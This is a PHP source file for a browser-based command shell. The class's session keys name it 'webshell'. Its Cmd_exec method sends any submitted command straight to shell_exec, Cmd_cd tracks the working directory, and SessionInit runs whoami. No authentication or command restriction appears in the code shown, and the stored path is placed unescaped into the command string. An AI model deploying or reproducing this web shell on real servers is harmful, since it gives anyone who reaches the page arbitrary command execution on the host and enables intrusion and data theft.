<?php
namespace ishibashiTokyo;

class Shell
{
    public function Cmd_clear(): void {
        $_SESSION['webshell'] = [];

        header("Location: " . $_SERVER['PHP_SELF']);
    }

    public function Cmd_cd($cmd): void {
        $_SESSION['webshell']['history'] .= sprintf(
            '[%s@%s %s] $ %s<br>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path'],
            $cmd
        );
        $cmd_array = explode(' ', $cmd);
        $_SESSION['webshell']['path'] = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);

        header("Location: " . $_SERVER['PHP_SELF']);
    }

    public function Cmd_exec($cmd): void {
        $_SESSION['webshell']['history'] .= sprintf(
            '[%s@%s %s] $ %s<br>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path'],
            $cmd
        );

        $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
        $_resulet = mb_convert_encoding(shell_exec($exec_cmd), 'UTF-8');

        $_SESSION['webshell']['history']
            .= sprintf(
                '<pre>%s</pre>' . PHP_EOL,
                htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true)
            );
    }

    public function SessionInit(): void {
        if (empty($_SESSION['webshell']['path'])) {
            $_SESSION['webshell']['path'] =  realpath('./');
        }

        if (empty($_SESSION['webshell']['history'])){
            $_SESSION['webshell']['history'] = '';
        }

        if (empty($_SESSION['webshell']['sys_user'])) {
            $_SESSION['webshell']['sys_user'] = trim(shell_exec('whoami'));
        }
    }
}